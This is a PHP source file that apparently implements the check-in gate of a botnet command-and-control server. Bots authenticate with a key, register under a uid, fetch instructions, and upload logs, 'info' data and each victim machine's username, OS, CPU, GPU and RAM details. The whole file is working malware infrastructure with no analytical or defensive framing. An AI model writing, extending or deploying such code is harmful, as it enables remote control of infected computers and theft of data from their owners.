<?php
 include 'assets/functions.php';
 require_once('assets/config.php');

 $key = $mysqli->real_escape_string(base64_decode($_GET['key']));
 $uid = $mysqli->real_escape_string(base64_decode($_GET['id']));
 $marker = $mysqli->real_escape_string(base64_decode($_GET['marker']));
 $tag = $mysqli->real_escape_string(base64_decode($_GET['tag']));

 $query = $mysqli->query("SELECT * FROM admin WHERE id=1");
 $result = $query->fetch_assoc();

 if( $result['key'] == md5($key) ) {
 	//- DBQuery -//
 	$query = $mysqli->query("SELECT uid FROM users WHERE uid='$uid'");
 	$result = $query->fetch_assoc();

 	
 	switch($marker) {
 		case "Indication":
 			if(!isset($result['uid'])) { create_new_user($uid, $tag); }
 			return_instruction($uid);
 			break;

 		case "Config":
 			if(!isset($result['uid'])) { create_new_user($uid, $tag); }
 			accept_config($uid, $mysqli->real_escape_string(base64_decode($_GET['un'])),
 								$mysqli->real_escape_string(base64_decode($_GET['mn'])),
 							    $mysqli->real_escape_string(base64_decode($_GET['os'])),
 								$mysqli->real_escape_string(base64_decode($_GET['tram'])),
 								$mysqli->real_escape_string(base64_decode($_GET['cpu'])),
 								$mysqli->real_escape_string(base64_decode($_GET['gpu'])),
 								$mysqli->real_escape_string(base64_decode($_GET['dig'])));
 			break;

 		case "Log":
 			if(!isset($result['uid'])) { create_new_user($uid, $tag); }
 			accept_log($uid, $mysqli->real_escape_string(base64_decode($_GET['info'])));
 			break;

 		case "Info":
 			if(!isset($result['uid'])) { create_new_user($uid, $tag); }
 			accept_data($uid, $mysqli->real_escape_string(base64_decode($_GET['info'])));
 			break;	
 	}
 		 
 }
?>